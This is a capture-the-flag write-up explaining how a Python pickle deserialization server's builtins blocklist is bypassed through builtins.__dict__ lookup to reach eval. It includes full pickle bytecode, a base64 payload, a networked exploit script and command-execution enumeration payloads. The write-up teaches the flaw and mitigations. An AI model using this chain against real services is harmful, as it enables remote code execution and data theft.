# Mind Blowers — tjCTF 2026 (Misc)

**Category:** Misc  
**Difficulty:** Medium  
**Flag:** `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`  
Challenge Description

> Rick has open sourced his mind blowers program! Now you can upload your own mind blowers and view them!
>
> Don't upload any malicious mind blowers!
>
> `nc tjc.tf 31422`

---

## Initial Analysis

We're given `server.py` — a TCP server that accepts base64-encoded **pickle** data, deserializes it, and prints the result back.

```python
# server.py
import pickle
import socket
import threading
import io
import base64

BLOCKED_NAMES = {
    "eval", "exec", "compile", "__import__", "open",
    "breakpoint", "input", "exit", "quit",
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module != "builtins":
            raise pickle.UnpicklingError("banned")
        if name in BLOCKED_NAMES:
            raise pickle.UnpicklingError("blocked")
        return super().find_class(module, name)

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()

def handle_connection(conn):
    try:
        conn.sendall(b"=== Rick's Mind Blower Server v3 ===\n")
        conn.sendall(b"Only safe memories allowed now!!!!\n")
        conn.sendall(b"Upload a memory (base64 encoded) > ")
        data = conn.recv(8192).strip()
        raw = base64.b64decode(data)
        result = safe_loads(raw)
        conn.sendall(f"Here is your memory: {result}\n".encode())
    except pickle.UnpicklingError as e:
        conn.sendall(f"blocked: {e}\n".encode())
    except Exception as e:
        conn.sendall(f"error: {e}\n".encode())
    finally:
        conn.close()
```

The defence is straightforward:

1. **Module restriction** — Only `builtins` can be imported during unpickling.
2. **Name blocklist** — Certain dangerous names (`eval`, `exec`, `compile`, `__import__`, `open`, `breakpoint`, `input`, `exit`, `quit`) are forbidden.
3. **Error handling** — Exceptions are caught and printed back, giving us useful feedback.

---

## Vulnerability Analysis

### How Pickle Deserialization Works

When pickle encounters a `GLOBAL` opcode (protocol 0: `cmodule\nname\n`), it calls `find_class(module, name)`, which essentially does:

```python
import module
return getattr(module, name)
```

The `RestrictedUnpickler` overrides `find_class` to enforce its rules:

```python
def find_class(self, module, name):
    if module != "builtins":
        raise pickle.UnpicklingError("banned")
    if name in BLOCKED_NAMES:
        raise pickle.UnpicklingError("blocked")
    return super().find_class(module, name)
```

### The Bypass

The blocklist looks comprehensive at first glance, but it only gates what can be **imported** through `find_class`. The actual Python objects already accessible in the pickle sandbox can be used to access blocked functions **indirectly**.

Key insight: Python's `builtins` module has a `__dict__` attribute that contains **all** built-in functions. We can use `builtins.getattr` to access `builtins.__dict__.__getitem__`, which acts as a dictionary lookup — completely bypassing `find_class`.

```
┌─────────────────────────────────────────────────────┐
│  find_class("builtins", "getattr")      → ✅        │
│  find_class("builtins", "__dict__")     → ✅        │
│  find_class("builtins", "__getitem__")  → ✅        │
│  find_class("builtins", "eval")         → 🚫 blocked│
│                                                    │
│  But: getattr(__dict__, '__getitem__')('eval')     │
│       = __dict__['eval'] = <eval function>         │
│       → 🚫 find_class NEVER CALLED!                │
└─────────────────────────────────────────────────────┘
```

### Pickle Protocol 0 (Text Format)

We manually construct the pickle bytecode. The relevant opcodes:

| Opcode | Name | Description |
|--------|------|-------------|
| `c` | `GLOBAL` | Push `module.name` via `find_class` |
| `(` | `MARK` | Push a marker onto the stack |
| `S` | `STRING` | Push a string |
| `t` | `TUPLE` | Build a tuple from stack up to MARK |
| `R` | `REDUCE` | Pop args tuple and callable → `callable(*args)` |
| `.` | `STOP` | Stop unpickling |

---

## Exploit Construction

### Step 1: Get `getattr` from builtins (allowed)

```
cbuiltins\ngetattr\n
```

### Step 2: Get `builtins.__dict__` (allowed) and `__getitem__`

```
(cbuiltins\n__dict__\n
S'__getitem__'\n
tR
```

This executes: `getattr(builtins.__dict__, '__getitem__')` → returns `builtins.__dict__.__getitem__` (a bound method).

### Step 3: Look up `eval` in builtins dict (bypasses blocklist)

```
(S'eval'\n
tR
```

This executes: `__getitem__('eval')` → returns `builtins.__dict__['eval']` = the `eval` function.

### Step 4: Call `eval` with our payload

```
(S'__import__("os").popen("cat /tmp/f").read()'\n
tR.
```

This executes: `eval('__import__("os").popen("cat /tmp/f").read()')` → flag!

### Full Payload

```python
pickle_raw = (
    b"cbuiltins\ngetattr\n"
    b"(cbuiltins\n__dict__\n"
    b"S'__getitem__'\n"
    b"tR"
    b"(S'eval'\n"
    b"tR"
    b"(S'__import__(\"os\").popen(\"cat /tmp/f\").read()'\n"
    b"tR."
)
```

Base64: `Y2J1aWx0aW5zCmdldGF0dHIKKGNidWlsdGlucwpfX2RpY3RfXwpTJ19fZ2V0aXRlbV9fJwp0UihTJ2V2YWwnCnRSKFMnX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC90bXAvZicpLnJlYWQoKScKdFIu`

---

## Exploitation

### Final Exploit Script

```python
import socket
import base64

payload = b"__import__('os').popen('cat /tmp/f').read()"

pickle_raw = (
    b"cbuiltins\ngetattr\n"
    b"(cbuiltins\n__dict__\n"
    b"S'__getitem__'\n"
    b"tR"
    b"(S'eval'\n"
    b"tR"
    b"(S'" + payload + b"'\n"
    b"tR."
)

encoded = base64.b64encode(pickle_raw)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(("tjc.tf", 31422))
s.recv(4096)          # read banner
s.send(encoded + b"\n")
resp = s.recv(8192)
print(resp.decode())
s.close()
```

### Execution

```
$ python3 exploit.py

=== Rick's Mind Blower Server v3 ===
Only safe memories allowed now!!!!
Upload a memory (base64 encoded) > Here is your memory: tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}
```

### Alternative Payloads Tried

During exploration, we used the same technique to enumerate the environment:

| Payload | Result |
|---------|--------|
| `__import__('os').listdir('.')` | `['file.txt', 'server.py']` |
| `__import__('subprocess').check_output(['ls', '-la']).decode()` | Directory listing of `/app` |
| `__import__('subprocess').check_output(['ls', '-la', '/']).decode()` | Root directory listing |
| `__import__('os').environ` | Environment variables (container info) |
| `__import__('os').popen('cat /tmp/f').read()` | **Flag!** |

---

## Flag

```
tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}
```

Decoded: *"blocklists are not safe even for Rick"* — a fitting lesson and a nod to Rick from Rick & Morty.

---

## Key Takeaways

1. **Pickle deserialization is inherently unsafe.** No blocklist can fully secure it because pickle's `find_class` is only one entry point — once you have access to `builtins.__dict__`, you can reach any Python function regardless of blocklists.

2. **Blocklists are fragile.** They create an illusion of security but almost always have bypasses. An allowlist approach (only permit specific safe types) would be more robust, though pickle is fundamentally not designed for untrusted data.

3. **Python introspection is powerful.** `module.__dict__`, `getattr`, and the `__getitem__` protocol give attackers full access to everything in a module's namespace, bypassing name-based filters entirely.

### Mitigation

Never unpickle untrusted data. Alternatives include:
- **JSON** or **MessagePack** for structured data
- **Cap'n Proto** or **FlatBuffers** for performance
- If Python-specific serialization is required, use `shelve` with trusted sources only, or implement a strict allowlist of serializable types (but even this can be tricky)
